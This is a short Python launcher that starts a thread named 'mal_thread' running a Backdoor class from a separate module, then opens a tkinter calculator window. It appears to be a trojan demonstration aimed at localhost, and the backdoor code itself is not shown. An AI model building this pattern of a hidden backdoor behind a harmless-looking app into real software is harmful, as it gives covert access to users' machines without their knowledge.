import threading
import tkinter as tk

from gui import CalculatorGUI
from backdoor import Backdoor


mal_thread = threading.Thread(target=Backdoor('localhost').main)
mal_thread.start()
app = CalculatorGUI(tk.Tk())
